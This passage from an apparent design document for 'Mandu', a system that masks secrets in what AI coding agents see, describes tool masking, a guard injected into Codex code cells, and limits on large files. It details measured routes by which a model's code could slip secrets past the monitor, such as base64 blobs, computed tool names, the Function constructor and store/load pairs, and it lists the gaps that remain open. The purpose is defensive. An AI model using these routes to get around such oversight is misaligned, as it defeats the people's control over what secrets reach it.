`<server>__` for Goose). A lone `*` is refused (it would switch the rule
off). A listed tool is treated as a tool the spec names: not masked for
being unmapped; the input scan and every path, command and session rule
still apply.

**Masked by decision (2026-10-09).** A tool someone looked at and chose
to leave without a mapping is listed in `MASKED_BY_DECISION`
(`mapped-tools.ts`, per spec id, with why): its result is masked whole as
above and `mapped_tools:` lifts it as above, but the session-health answer
(`toolSurface`, the `tool_surface` event's unknown list) does not report it
as drift. Goose's `extensionmanager__list_resources` / `read_resource` are
the first: they list and read the MCP resources of the extension the model
names, a server whose own tools are masked until the person maps it. The
same answer no longer reports a tool the gate surface names (Goose's
`analyze`, `read_image`), which has a mapping by (4) above.

**Mapped only under the guard (2026-10-09).** A tool that reads a file the
model names by a NAME, in the agent's own process, has no field any gate
can read the path from; the guard handing the agent's open the twin is the
only thing between a labelled file and the model. Such a tool is listed in
`GUARD_MAPPED_TOOLS` (`mapped-tools.ts`; Goose's `load` and `load_skill`)
and has a mapping only in a session the guard confines: the launcher's
`beginLaunch` record for the session's key claimed posture `confined`
(which the cache rules also call confined) on an attested channel, no
other launch of the session claimed otherwise, and no unwalled launch
exposes the human plane at the time of the ask. Everywhere else (`gated`,
`read-blocked`, no record, an arbiter restarted since, an exposed human
plane) `toolMapping` answers none and the result is masked whole with a
note naming the missing guard (`unguardedToolWhy`); `mapped_tools:` does
not lift it. The records are in memory and per launch token (`endLaunch`
drops one).

**Cost.** Every remote MCP server and connector, every MCP resource tool,
a plugin's tools, Goose's unmapped built-in extensions (`memory__*`,
`extensionmanager__{list,read}_resource`, `chatrecall__*`, …; the registry
listings are mapped since 2026-10-09, and `load` / `load_skill` then in a
guarded session only, supported-agents.md §5.6) and any tool a new agent release adds reach the
model as one placeholder until the person lists them. The placeholder is `no-model`, so `inspect_symbol` cannot read it
either. A result masked whole registers its text as values (as every
whole-result mask does), so the same lines in another tool's result are
masked too. One more `callTaint` round trip per tool
result per request (the classify call already makes one).

**Superseded.** §11.17 (a) 3 and (b): rule (c) for unknown OpenCode and
Goose tools, and the resource-tool shape match. `supported-agents.md` §2.3
("Left as is, and why") recorded the open question; this is its answer.

Tests: `arbiter/test/unit/mapped-tools.test.ts` (the validator, the
compiler, the matcher in every spelling, `toolMapping`'s order, the note),
`arbiter/test/component/unmapped-tool-mask.test.ts` (the real IPC: each
agent's spec, harness tools, gate surface, a registered server, a built-in,
`mapped_tools:`, the axis off; red on master), the anthropic-proxy's
`test/unit/unmapped-tool-mask.test.ts` and `test/component/
unmapped-tool-mask.test.ts` (Claude Code, OpenCode, Goose, OpenClaw through
the real proxy with a mock upstream: the result only as a symbol, the note,
the spec's tools forwarded), the openai-proxy's `codex-mcp.test.ts`
(§11.18 cases: resource tools masked in a session that read nothing, a
renamed one, the built-ins not asked) and `test/component/
mcp-server-taint.test.ts` (the real proxy), and the leak oracle
`tests/stack/unmapped-tool-mask.test.ts` (the real arbiter, policy.yaml
`mapped_tools:` loaded, both production adapters).

#### A cell's resource tools (2026-10-11)

**Status: BUILT.** Confidentiality axis only. Openai-proxy only (Codex).

**The question.** codex-cli 0.162's code mode declares `read_mcp_resource`,
`list_mcp_resources` and `list_mcp_resource_templates` as nested tools of
every `exec` cell, even with no MCP server configured (supported-agents.md
§6.4). The direct call is masked whole (above). A cell calling one does not
qualify under §11.13's grammar (the grammar takes `mcp__` tools and
`exec_command` only), so it was an `exec` cell, a built-in, under the cell
rules alone: masked only while the session held a raw read. Can a cell carry
a secret this way?

**The answer: yes, in a session where nothing read a secret raw.** Measured
on the real codex 0.162.0 against a scripted model and a stdio MCP server
serving a labelled, registered `.pgpass` as a text resource and as an MCP
`blob`, with the proxy and arbiter as shipped:

- the text read was masked, by the value backstop alone (the file's line,
  verbatim);
- the blob read (the same bytes, base64) reached the model raw: no value
  fingerprint matches base64;
- the listing and the template listing (the server's own text) reached it
  raw, and so did a call by a computed name (`tools[n]`) and a `store` /
  `load` pair (codex keeps `store`d values across the cells of a session:
  the reading cell prints nothing, the next prints the value).

Where can a server hold such a copy without the session holding a raw read?
Under `confined` a stdio server the agent starts is in the guard's tree: an
open of a registered file is served the twin (symbols only), and a listed
reader's raw open is a session row, which masks every such cell. So the
copy comes from a server the guard does not run: a remote MCP server or a
connector (which may hold the same secret, as a private repository holds a
`.env`), or any server under `gated`, where nothing records a raw read.
These are what the direct call's whole mask is for. Codex cannot be made to
add a server mid-session by the agent: an `exec_command` that appends a
server to `$CODEX_HOME/config.toml` leaves the running `codex exec` without
it (`unknown MCP server`, measured on 0.162.0; the interactive TUI not
measured). The rule below does not depend on it.

**The rule** (`interceptors/openai-proxy/src/cell-resource-tools.ts`). A code
cell (`exec`, or another freeform tool that carries code, `js_repl`; never
`apply_patch`) that the grammar does not identify call by call is read for
the resource tools it may call, and each is asked about exactly as its
direct call is: `callTaint{unmappedTool: <tool>}` under `<call id>#<tool>`,
no command, not a built-in. The arbiter answers `unmapped` unless
policy.yaml `mapped_tools:` lists the tool, and the cell is masked whole,
with the note "this cell calls read_mcp_resource; Mandu has no mapping …".
Raise-only (folded into the cell's own answers); an ask that throws masks;
a `wait` that continues the cell is asked under the cell's id. A cell may
call them when its source:

- **names one**: any identifier-like run holding `mcp_resource`, anywhere
  in the text (a string, `tools["read_mcp_resource"]`, a destructuring, a
  renamed tool), asked under that spelling;
- **can call a nested tool by a name it does not write, or read a stored
  value**: `tools` other than as `tools.NAME`, `tools?.NAME` or
  `tools["NAME"]`; `globalThis`, `eval`, `Function`, `constructor`,
  `Reflect`, `import`, `require`, `__proto__`, `getPrototypeOf`; a `\u`
  escape (an identifier may be spelled with one); or `load`. Asked as each
  of the three.

It is a deny-list over the text, so it over-approximates (a word in a string
or a comment counts). A cell that only writes `tools.exec_command` and the
`mcp__` tools by name, or reads only `ALL_TOOLS`, is not asked: its rules
are unchanged.

**Cost.** In every session, a cell that calls a resource tool, uses `load`,
or reaches `tools` by a computed name or one of the words above reaches the
model as one placeholder until the person lists the resource tools under
`mapped_tools:`. An identified cell (the grammar's) and a cell that names
none of these keep their rules. Since the cell guard below, this text rule
is the fallback for a cell that does not carry the guard; a guarded cell
pays none of it.

**Residual (closed by the cell guard below).** A cell that builds a property
key at run time can reach the Function constructor without writing any word
above (`x[k]` where `k` spells `constructor` from pieces), and from there
the `tools` object by a string. Flagging every computed key (`lines[i]`)
would mask most data processing cells in every session, so the text rule
stops here.

**An MCP tool in a cell (2026-10-11, the follow-up).** The same gap held for
every `mcp__` tool, not only the resource tools. A cell the grammar refuses
(it transforms the result: `r.content.map((c) => c.text).join("")`) that
calls `tools.mcp__<server>__<tool>` of a server the launcher did not
register (a remote server, a connector) was asked only the cell rule, so
in a session that read nothing its result reached the model raw while the
namespaced call to the same tool was masked whole (shown by
`tests/stack/codex-cell-tools-guard.test.ts`, red on the previous master;
the real codex 0.162 hands such a cell the server's answer). The text rule
now asks about every `mcp__` name a refused cell writes, as its direct call
is: an unregistered server's is masked whole, a registered server takes the
per-server rule, Mandu's own tools are answered empty.

Tests: the openai-proxy's `test/unit/cell-resource-tools.test.ts` (what the
text rule counts and what it does not; the wire: each form masked with the
note, the `wait` continuation, the identified and the unnamed cells not
asked, `mapped_tools:` letting it through, a throw masking) and
`codex-mcp.test.ts` (the cell beside the direct calls); the leak oracle
`tests/stack/codex-cell-resource-tools.test.ts` (the real arbiter with the
file labelled and registered, the proxy over HTTP in its production wiring,
the wire codex 0.162.0 sent; red without the asks: the blob, both listings,
the computed name and the `load` leaked); `tests/stack/mcp-server-taint.test.ts`;
and the drill suite's `codex-cell-resources.test.ts` (the real codex 0.162
against a scripted model and a real stdio resource server; red the same way).

#### The cell guard (2026-10-11)

**Status: BUILT.** Confidentiality axis only. Openai-proxy only (Codex code
mode, `exec` cells).

**Why.** A cell is JavaScript: what it calls cannot be read off its text in
general (the residual above), and the text rule that tries masks whole the
cells that merely might (`load`, a computed `tools` name). The guard decides
at run time instead, where every way to a nested tool ends at one object.

**The mechanism** (`interceptors/openai-proxy/src/cell-guard.ts`). On the
response side the proxy rewrites every `exec` cell the §11.13 grammar does
not identify call by call (every cell when the battery does not state
isolation), in every snapshot of the item (the input deltas, `.done`,
`.output_item.done`, `.completed`, the JSON form), putting one line at its
head (after a `// @exec:` pragma line, which must stay first):

- every own key of `tools` that is not on the keep list is redefined as a
  function that throws "Mandu: X is switched off inside code cells: Mandu
  has no mapping for it, so its result could carry a secret. Call it as its
  own tool call, or ask the user to list it under mapped_tools: in
  policy.yaml", non-writable and non-configurable; then
  `Object.preventExtensions(tools)`;
- `store` and `load` are replaced (non-writable, non-configurable) by
  versions that prefix every key with `mandu:`, so a guarded cell never
  `load`s a value an unguarded cell stored;
- fail closed: a tool to switch off that is already non-configurable (and
  not the guard's own, for a cell that repeats the guard) throws before the
  model's code runs.

The keep list: codex's own tools (its shells and `CODEX_MAPPED_TOOLS`), and
each tool the cell's text names that the arbiter maps (asked as the direct
call is: an `mcp__` tool of a registered server, Mandu's own tools, a tool
under `mapped_tools:`). Everything else is switched off: the resource tools,
an unregistered server's tools, a tool a codex release adds, a mapped tool
the cell reaches without naming it. The guard applies only when the arbiter
masks a tool with no mapping (it asks about a name no tool has): with the
axis off, an older arbiter, or an ask that fails, the cell goes as written.

**What it survives** (each measured on the real codex 0.162.0 through the
real proxy and arbiter against a scripted model, the drill suite's
`codex-cell-tools-guard.test.ts`; the same reaches under node's own V8 in
the openai-proxy's `test/unit/cell-guard.test.ts`): a call by name, by a
computed name (`tools[n]`), through `x[k]` → `constructor` → `Function` →
`tools`, `globalThis.tools`, `(0, eval)("tools")`, `Function("return
this")()`, a hoisted function; `delete`, `Object.defineProperty` and
assignment on a switched-off tool (each refused); `call` / `apply` /
`Reflect.apply` on a kept tool with another `this` (a tool function is bound
to its tool: `exec_command` still runs `exec_command`); a function `store`d
by an earlier cell (refused: values must be serializable) and data an
unguarded cell stored (not visible to a guarded `load`). `ALL_TOOLS` holds
`{name, description}` only. A static or dynamic `import` is refused by codex
0.162 ("Unsupported import in exec"), so no code runs before the guard.

**The request side.** A cell is trusted to have run guarded when, with the
battery stating isolation, it starts (after a pragma line) with exactly the
text `guardPrelude(keep)` writes for its keep list, and every kept tool is
still codex's own or mapped by the arbiter now. A model that writes the
guard itself gains nothing: the text is code that runs exactly as the
proxy's does, and its keep list is checked. Such a cell is not asked about
what its text may reach. Anything else keeps the text rule above: a cell
without the guard (one delivered before this change, a session with the
axis off when it ran), a keep list naming a tool that is no longer mapped
(a forged one included), an unisolated battery, and a cell whose code names
`import` (an import would run before the guard; codex 0.162 refuses it). The
cell's other rules (the session rule, an exec literal's tree, the classify
scan of the model's own code) are unchanged.

**Narrowed** (what the guard makes safe, so the text rule no longer masks
it in a guarded cell): `load`, a computed or aliased `tools` name,
`globalThis`, `eval`, `Function`, `constructor`, `Reflect`, `require`,
`__proto__`, `getPrototypeOf`, a `\u` escape, and a resource tool or an
unmapped `mcp__` tool the cell names (it throws instead of answering). Not
narrowed: `import`, and every cell without a trusted guard.

**Cost.** One line (about 1.5 KB) at the head of each guarded cell, which
the model sees in its history. In a cell, a tool Mandu has no mapping for
fails with the guard's error instead of returning a result masked whole; a
mapped tool reached by a computed name it does not write is switched off
too (write its name). codex's `clock__curr_time` is a nested tool with no
mapping, so it is switched off in such cells.

Tests: the openai-proxy's `test/unit/cell-guard.test.ts` (the text, the
split, the reaches under V8, the keep list, the stream rewriter's
snapshots, the request side's trust and its fallbacks) and the leak oracle
`tests/stack/codex-cell-tools-guard.test.ts` (an unregistered server's tool
in a refused cell, red on the previous master; the guard as delivered; the
guarded cells narrowed and a forged guard refused; the axis off delivering
the cell as written); the drill suite's `codex-cell-tools-guard.test.ts`
and `codex-cell-resources.test.ts` (the real codex 0.162: no canary reaches
the model, the unmapped server answers no call, a computed `exec_command`
name and a guarded `store` / `load` pair reach the model raw).

### 11.18 Large and binary files, a holder's copy, and the piece bound (2026-10-07)

§11.15 left two gaps. (a) The arbiter's own registration of a file read raw
skipped a file over 1 MiB or binary, and a binary file registered at launch
gave no piece: its printable strings were glued to the NUL bytes around
them, so `strings vault.db`, or a line of a 2 MiB export printed by a later
call, reached the model raw. A large file the launch registered did get its
pieces, in one pass with no bound (a dense 16 MiB text file: 726,420
pieces, about 1 GiB of heap and a ten-second automaton, rebuilt on every
new secret row). (b) A holder's raw read of a copy it wrote (plan 13 D4)
registered nothing, so a value only the copy holds (a session token the
holder derived from the key) was no known secret.

**Pieces of a large or binary value** (`egress-fingerprint.ts`
`valuePieces`). A value of at most one window (`PIECE_WINDOW_CHARS`, 1 Mi
characters) that is not binary is extracted in one pass, as before. A
binary value (a NUL in its first 8000 characters, git's test) is first
reduced to its printable strings, one a line (what `strings` prints: an
invalid UTF-8 sequence decodes to U+FFFD and never swallows the ASCII byte
after it); each string of 24+ characters is a line piece, and its bare
tokens and credential-shaped spans are pieces as in any labelled file.
Otherwise the text is scanned window by window, each ending at a line
break (or a token break when a window holds none), the span search
reaching 16 KiB back into the window before, so a PEM key across a
boundary is found whole; the pieces are the union of every window's and
equal the one-pass extraction's (a unit test compares them on a value over
two windows).

**The bound** (`PieceLimits`, `DEFAULT_PIECE_LIMITS`): 16 Mi characters
scanned and 65,536 pieces kept per value. A dense 1 MiB text file gives
about 47,000 pieces, so every file the self-registration took before stays
complete. A value cut at either bound is INCOMPLETE: a piece past the bound
would not be matched. The arbiter's own registration reads a file only up
to the scan bound in bytes; a larger one is not read, and is recorded as
unpieced (by size, mtime and inode).

**Fail-closed past the bound.** A file whose pieces are unknown (over the
scan bound, or a registered row the value index cut: `incompleteRows`) is
one whose printed pieces the backstop would miss, so:

- `callTaint`: no output rule (`output: clear`, `mask`) releases a call
  whose tree read such a file raw; the rule is `secret` and the output is
  masked whole (rule (i)). The cost: a reader cleared for a file over 16
  MiB, or for one dense enough to pass 65,536 pieces, shows the model
  nothing; the arbiter's log names the file.
- `decideSecretOpen` (plan 13 D4): a holder of every source does not read
  such a copy raw; the law decides (the twin, for a copy with no reader
  list).

The bound opens no other path: a reader's output is masked whole by rule
(i) unless a rule clears it, and the guard serves every other program the
twin.

**The outbound check and the prompt filter past the bound** (checked
2026-10-07). Both match by the same value index, so both miss a piece past
the bound. Neither needs a fail-closed rule of its own, because every route
by which such a file's bytes can reach them is already gated without a
piece:

- Outbound. The only processes holding the bytes are the file's readers
  and what they hand them to: their children, pipe and socket-pair
  readers (plan 13 D2), and programs that open their copies (D4). Each is
  a holder, and a holder may connect or send only where every file it
  holds is bound: the guard on a direct connect, the net-proxy on every
  request (D1, D6). An unattributed sender is refused while the session
  holds a secret. At a bound host the send is a release, and the tripwire
  stands down there for every file anyway. So the tripwire, which only
  matters at an unbound host, has nothing to add for such a file. A fail
  closed of its own would have to stop senders that never held the file,
  the whole session's network, which is no rule.
- The prompt. Program output that reaches a user turn is read as a shell
  result: Claude Code's `!cmd` bash mode, and OpenCode's user shell and
  background notices (`opencode-background.ts`). So the reader's output is
  masked whole like a tool result (`callTaint`, above). The compaction
  request carries tool results as tool results. What is left is text the
  human types or pastes (including an IDE selection), which is the human's
  own act and no process's, and other harness text.

Program output in other harness text is NOT read as a shell result. Claude
Code's prompt-submit hook output (`<user-prompt-submit-hook>`) and a hook's
added context are an example. Such text gets only the registered-value
check. That is a gap for every labelled file a hook reads raw, not only one
past the bound, and it is recorded as open.

Test: `tests/stack/large-file-egress-prompt.test.ts`. It uses the real
net-proxy, the arbiter and the anthropic-proxy's rewrite over its
production adapters, with a 17 MiB file. A piece past the bound does not
trip the tripwire. Its holder is refused at an unbound host, and so is an
unattributed sender. The holder is released at the bound host, and its
bash-mode output reaches the model masked whole.

**The index keeps a large row's automaton** (`registered-values.ts`). A row
of at least 4,096 pieces (`OWN_AUTOMATON_PIECES`) gets an automaton of its
own, kept while the row is unchanged, so a new secret row (every masked
result adds one) rebuilds only the small rows' automaton; a query walks
each automaton once.

**A holder's copy self-registers.** At the D4 grant (a process holding
every source of a derived copy opens it), the arbiter registers the copy as
it registers any labelled file read raw (`registerReadFile` →
`registerSecret`), at its sources' bindings (the label by reference, plan
13 §4.6), so the copy's own values are known secrets. The cost: every copy
a holder reads back becomes a registered value, its long lines included,
and a line it shares with an unrelated file masks that file's output too
(over-masking, never a leak).

**Measured** (this host, Node 22: one value through `valuePieces` and the
index's first build, then a new small row's rebuild):

| Value | Pieces | Complete | Extract | First build | A new row after |
|---|---|---|---|---|---|
| dense text, 1 MiB | 47,191 | yes | 0.24 s | 1.9 s | 40 ms |
| dense text, 4 MiB | 65,536 | no (pieces) | 0.73 s | 3.1 s | 49 ms |
| dense text, 16 MiB | 65,536 | no (pieces) | 0.70 s | 2.5 s | 32 ms |
| sparse log, 4 MiB | 2,118 | yes | 0.34 s | 0.32 s | 24 ms |
| random binary, 4 MiB | 1 | yes | 0.63 s | 0.74 s | 0.4 ms |
| random binary, 16 MiB | 8 | yes | 2.4 s | 2.6 s | 0.7 ms |

Before, the dense 16 MiB value took 1.6 s to extract and 10.6 s to build,
again on every new secret row. A query over a 120 KB output takes 5 to 30
ms. The extraction runs once per change of the file, on the arbiter's
thread (the first build blocks it for up to about 3 s).

Tests: arbiter `large-file-pieces.test.ts` (a binary value's strings, the
windowed extraction equal to the one-pass one, the bounds, the index's
large-row automaton and `incompleteRows`), `read-file-registration.test.ts`
(a 2 MiB and a binary file registered on a raw read; a holder's copy
registered at its sources' bindings; past the bound, `callTaint` answers
`secret` for a cleared reader and the holder gets the copy's twin, each
with its control), and the e2e `tests/stack/large-file-pieces.test.ts`
(through the production anthropic-proxy: a short password deep in a 2 MiB
file, a binary file's token and a holder's copy's session token, each
printed by a later clean call, reach the model only as symbols; a cleared
reader of a 17 MiB file is masked whole, of a small file released; a short
prose line is forwarded raw; each red on the code before).

## 12. Configuration surface

### 12.1 Every key, its default, who may set it

| where | key | default | set by | end-user surface |
|---|---|---|---|---|
| `paths[]` | `readers: [app…]` | absent (structured twin for all) | Inbox allow (§11.1), consumer table (§11.3), `policy.yaml` | Secrets panel: "programs that may read this file" |
| `paths[]` | `others: deny \| twin` | `deny` once `readers` exists; an explicit `twin` also serves a known consumer instead of holding it (§11.13.1) | `policy.yaml` only | none (expert) |
| `paths[]` | `extract: '<regex, one group>'` | per catalog shape (§2.4); whole file if no shape | `policy.yaml` only | none (expert); a shape miss shows as "whole file masked" |
| `paths[].readers[]` | pin (`app`, `path`, `sha256`; `script`, `scriptSha256`; `from`) | pinned at first use | Inbox allow, consumer table | "re-approve" appears when a pin breaks |
| `paths[].readers[]` | `output: secret \| clear \| mask` (Plan 13 D3) | `secret` | `policy.yaml` only; refused for a program that runs code | the file explorer's Why? says what the AI sees of each reader's output |
| `paths[].readers[]` | `mask: [regex…]` (with `output: mask`) | none | `policy.yaml` only | none (expert) |
| `apps[]` | `output`, `mask` | DEPRECATED (Plan 13 D3): validated, clears nothing, the validator warns | `policy.yaml` | the Rules page row says it no longer applies |
| `env` | `secrets: [NAME \| PREFIX_*]`, `exempt: [...]`, `sources: [...]` | built-in shapes (§11.4) | `policy.yaml` | launch notice lists what was masked |
| launcher | wire release (TLS inspection + CA export) | on with the confidentiality axis (§11.5) | `net-proxy-mitm = false`, per-host opt-out | `mandu doctor` row |
| launcher | hold-and-ask | `secrets-ask = known` | `config.toml` `secrets-ask = always \| known \| never`, `secrets-ask-timeout` (§12.2) | Protection drawer |
| launcher | the bind | on where the host can bind (§8 phase 6) | `secret-bind = false`, `--no-secret-bind`, `MANDU_SECRET_BIND=0` | none (expert) |
| launcher | npm and pip read the twin of a wire-served HOME file (§11.13.1) | on with TLS inspection | `MANDU_WIRE_TWIN=0` in the launcher's environment | none (expert) |

Rules that hold for every row: nothing is read from the workspace, from an
environment variable the agent's tree can set, or from an MCP tool
(§11.6); every write the dashboard or the Inbox makes lands in the
arbiter-owned `policy.yaml` with `by:`/`added:`; the loader rejects
`output: clear|mask` on a program that runs code and `readers` on the agent
binary with a named reason. `mandu secrets reader add` is not built: the
Inbox allow and `policy.yaml` are the two writers.

### 12.2 Hold-and-ask has a ceiling

A held `open()` blocks the program, and the tool call around it has its
own clock (Claude Code's Bash tool: 120 s by default). The hold lasts at
most `secrets-ask-timeout` (default 60 s; `askTimeoutMs` in the guard's
policy file, `MANDU_SECRETS_ASK_TIMEOUT`). On expiry the open fails with
`EACCES` and the `[mandu:secret]` note says "held for 60 s, nobody
answered; the approval is still waiting in the dashboard", and the row
**stays pending**: an allow answered later makes the next attempt succeed
with no new prompt.

**The ceiling is the arbiter's denial, not the guard's.** A guard that
denied on its own left no `secret_open_denials` row, so the tool result
carried no note. The ceiling is one more `decideSecretOpen` carrying
`heldMs`: a row still pending is recorded as a denial with the reason
`heldTimeoutReason` (`arbiter/policy/flow-taint.ts`) and answered `deny`;
the row itself is not touched, and an answer that landed during the last
poll interval wins over the timeout. Only an arbiter that has gone away
mid-hold leaves the guard to deny by itself. The proxy renders the reason
as the §11.8 `held:` form.

**The enforce-clean box never asks.** The exec box's default posture
(`exec-routing.md §8` §5.1) runs a boxed command twice when its clean
attempt fails. A secret `open()` in the attempt would be held, consume the
human's once-answer, and leave the rerun's hold to expire; a raw descriptor
there would also hand the clean box a file outside its read-allow set. The
guard marks the process that execs the applier with `--clean`
(`secret_open::is_clean_box_exec`) and refuses a secret open by it or any
descendant with `EACCES` and no ask; the rerun, outside the box, asks once.

**Drills.** A drill-runner prompt step declares `hold: { app, answer: deny
| once | allow }` (or a list); while the turn is open the runner polls the
arbiter's admin socket for pending `open:` rows of its session and answers
them as the human would; a hold NO step declared is denied and graded as a
`silent-hold` FAIL. Scenarios S7 (`deny`: EACCES, the denied note, canary
absent) and S8 (`once`: the program reads raw, the Bash result is one
secret symbol, the terminal shows the human the value) run with
`MANDU_SECRETS_ASK=always`; `drill-runner.test.ts` pins the
grading. Under `always` Claude Code's own housekeeping `git` opens the
workspace's `.env` and is held as well; the default `known` never asks for
`git`, one more reason `always` is the expert setting. Since plan 13 D8
(2026-10-03, printers admit nothing) `cat` is a printer: the arbiter
serves it the twin and never asks, so S7 and S8 run the drills' own
reader, `mdu-digest`, which prints only a file's SHA-256 (2026-10-04;
test-reorganization.md §6.4, "The hold drills' reader"). The live grader
says "gate not exercised" (WARN) when a held program's output is the twin
and not the check's marker, and keeps a FAIL when the marker shows a read
with no hold. Open (2026-10-04): under Claude Code 2.1.288 the `once`
answer's output never reaches the human, because the Bash output now goes
through a task file the holder writes, which the agent's own open gets
only as a twin (§6.4 there).

### 12.3 Coexistence with Claude Code's own sandbox and mask

`launcher/src/claude-sandbox.ts` reads the four settings files Claude Code
merges (user, project, project-local, managed), honors `mask` entries only
from the scopes Claude Code honors them from (user, managed), and at every
confidentiality launch of the `claude` target: names the sandbox when it is
on; WARNS per settings file about each file masked by BOTH
`sandbox.credentials.files` and Mandu's twin, and each variable masked by
both `sandbox.credentials.envVars` and Mandu's env-var symbols, naming the
entry to remove; notes a `deny` on a confined file (stricter, not a
conflict); and splices the arbiter socket into one `--settings`
(`sandbox.network.allowUnixSockets`). `mandu doctor` shows a "Claude Code's
own sandbox" row. Two seccomp filters stack (the kernel runs both): the
interposer is installed outside Claude Code's bubblewrap, so it sees the
sandboxed command's opens too. Two masks on one file are a double
placeholder; Mandu's twin is the one to keep, since it covers the LLM's own
reads and the whole tree, theirs sandboxed Bash only. Tests:
`launcher/test/unit/claude-sandbox.test.ts`, `doctor.test.ts`,
`launcher/test/kernel/claude-sandbox.test.ts`.

**Known limitation** (measured, `comparisons.md` §5.3): under
Mandu's default whole-agent Landlock network rule Claude Code's sandbox
does not start (its proxy binds an ephemeral loopback port; the rule
grants bind on named ports only), so running the two together needs
`--no-landlock-net`.

**macOS (measured 2026-09-29, macOS 26.5.1; decided 2026-10-02): the two
sandboxes do NOT nest, so Mandu turns the agent's off.** Claude Code's
sandbox there is Seatbelt, one `sandbox-exec` per Bash command, and a launch
whose Mandu profile is applied (secret protection, or only the TCP rules in
mode `off`) runs the whole agent under Mandu's own Seatbelt profile. macOS
refuses to apply a profile inside a sandboxed process unless the two are
identical plain `(allow default)` profiles: `sandbox-exec -p '<Mandu's deny
profile>' sandbox-exec -p '(version 1)(allow default)' /usr/bin/true` fails
with `sandbox-exec: sandbox_apply: Operation not permitted` (exit 71). With
`sandbox.enabled` on, every sandboxed command would fail under mandu. So the
launch (`claude-sandbox.ts` `planDarwinClaudeSandbox`, gated on the profile
REALLY applied and on a session argv):

- asks Claude Code itself whether the sandbox would be on: `claude
  [--settings <the run's>] [--setting-sources …] sandbox status`, a
  read-only answer (no model) that covers every source Claude Code reads,
  managed ones included (2.1.286; below 2.1.284 the probe is skipped and
  the settings files Mandu reads decide);
- when it would be, adds `{"sandbox":{"enabled":false}}` to the LAST
  `--settings` of the launch: Mandu's own (merged with the TUI pin), or the
  run's own when it passed one, since Claude Code reads only the last
  `--settings` and merges it over the user, project and local files, never
  over managed ones;
- asks again with that final `--settings`: off, the launch prints ONE line
  (`CLAUDE_SANDBOX_OFF_NOTE`, an attention line the default display shows
  as one short posture line, packaging.md §5)
  saying so and what it gives up; still on, managed settings keep it, and
  the launch WARNS and changes nothing.

Mandu reads the settings sources Claude Code 2.1.286 reads, so a rule in
any of them is seen: the user file (`CLAUDE_CONFIG_DIR`;
`cowork_settings.json` instead under `CLAUDE_CODE_USE_COWORK_PLUGINS`), the
project and local files (the local one also at the repository root and, in
a linked worktree, at the main checkout, found the way Claude Code finds
it: `gitdir:` → `commondir`, checked back through the gitdir's `gitdir`),
the managed file and its `managed-settings.d/*.json` drop-ins, the
server-managed cache (`<config dir>/remote-settings.json`) and, on macOS,
the forced MDM preferences (`/Library/Managed Preferences[/<account
name>]/com.anthropic.claudecode.plist`, read through `plutil`). Each is
parsed as Claude Code parses it (a blank file is `{}`, a leading byte-order
mark is dropped). What it cannot see keeps the sandbox: a managed source
with a `policyHelper` / `policyHelpers` (an administrator's program
computes managed settings), and a run that passes `--managed-settings` or
`--project-config-root`. Besides `sandbox.credentials` and
`sandbox.filesystem.denyRead`, Claude Code's sandbox read-denies every
`permissions.deny` `Read(...)` path and, with
`permissions.blockReadsOutsideWorkingDirectories`, every home and volume
outside the working directories; Mandu counts both (the second always
keeps the sandbox: Mandu has nothing like it).

It also keeps the sandbox, with a WARNING, in this order: the run's own
`--settings` turns it on (that run's choice; for a `--settings` FILE the
advice names both steps, dropping the key and passing the settings
inline); that `--settings` is a FILE (Mandu never copies a settings file
onto the command line, where every program the agent runs can read it) or
is not a JSON object; managed settings keep it on (the second probe); a
source Mandu reads cannot be parsed or converted (its rules unknown);
Claude Code says it is on but no source Mandu reads turns it on (the rules
of that source are unknown); `blockReadsOutsideWorkingDirectories`; or a
read rule (`sandbox.credentials`, `sandbox.filesystem.denyRead`, a `Read`
deny rule), in the sources or in the run's own `--settings`, names a file
or variable Mandu does not protect itself (no read-block or twin, no env
symbol; none at all in mode `off`): those rules apply to Bash only inside
Claude Code's sandbox, so turning it off would expose what they protect.
Mandu protects single files that exist, so some rules never count as
covered, and the WARNING gives advice that can work for each: a folder or
a glob (list the files themselves and label those, or remove the entry); a
relative path, which Claude Code resolves against its own root (write it
as an absolute path, `//path` in a `Read` rule); a missing or empty file
(remove the entry: a label cannot help); a file outside where Mandu's
discovery looks (the home folder and the launch folder, four folders deep)
(remove the entry). A `Read` rule is read as Claude Code saves it (`(`,
`)` and backslashes escaped). Without the probe, any managed source that
turns the sandbox on keeps it. The options that move a source
(`--setting-sources`, `--managed-settings`, `--project-config-root`) are
passed to both probes, found anywhere in the argv (Claude Code may take a
`--` as an option's value); without the probe, a run that passes the
latter two gets a WARNING that Mandu cannot tell whether they turn the
sandbox on. The probe runs only on a Claude Code that has it
(`claudeStatusProbeAllowed`: 2.1.284 or later, from the launch's version
check; an older one could take "sandbox status" for a prompt), with no
credential and a dead model endpoint in its environment. The OFF line says
what the profile still blocks: in mode `off` it blocks no credential file,
and the line says that instead.
Off, Bash loses Claude Code's write and network limits and
`autoAllowBashIfSandboxed`, so it asks for permission as usual; in mode
`secrets` Mandu's profile still blocks the credential files for every
program the agent runs (mode `off` blocks none).
Nothing is written to the user's settings files; `/sandbox` in the session
refuses to change a key `--settings` sets. The `allowUnixSockets` overlay
(a launch with no Mandu profile) carries every spelling Seatbelt may
compare, since its path filters match canonical paths only: the given one
(through the rendezvous `current` link under `/var/folders/…`), its
realpath, and the `/private` form. The managed settings file is read from
`/Library/Application Support/ClaudeCode/managed-settings.json` there.

The same nesting stops Codex's per-command Seatbelt on macOS (re-measured
2026-10-01 with Codex 0.159.3: Codex starts inside Mandu's profile, and each
command it runs fails with `sandbox_apply: Operation not permitted`;
packaging.md §6 item 1). `codex-sandbox.ts` `codexSandboxLaunch`, gated on
the same applied profile and on a run that talks to the model
(`codexTalksToModel`), adds `-c sandbox_mode="danger-full-access"` to
Mandu's own Codex overrides, which `codex-argv.ts` splices after argv[0] and
after every subcommand (a root-only `-c` is dropped as soon as any level has
its own; a typed `--sandbox` would refuse to repeat and outranks a user's
`-c default_permissions`), and prints ONE line (`seatbelt-mandu-off`). The
override changes only the sandbox: the approval policy stays as configured.
It keeps the sandbox, with a WARNING (`seatbelt-nests`), when the run asks
for it (`-s`/`--sandbox`, `-c sandbox_mode`/`default_permissions`,
`--approve-for-me`, `--enable network_proxy`, a `-p` profile that sets the
mode or its permissions, in their `=` and attached spellings;
`--not-so-yolo`, the alias of `--approve-for-me`), when an administrator
requires it
(`/etc/codex/requirements.toml`, `/etc/codex/managed_config.toml`, forced
MDM preferences in `com.openai.codex`, the cloud requirements cache: Codex
would fall back to read-only, and `exec` would refuse to start), or when the
user's config relies on it: a permission profile of the user's own,
defined or selected (`default_permissions` naming one that does not start
with `:`, any `[permissions…]` table or `permissions…` key), since every
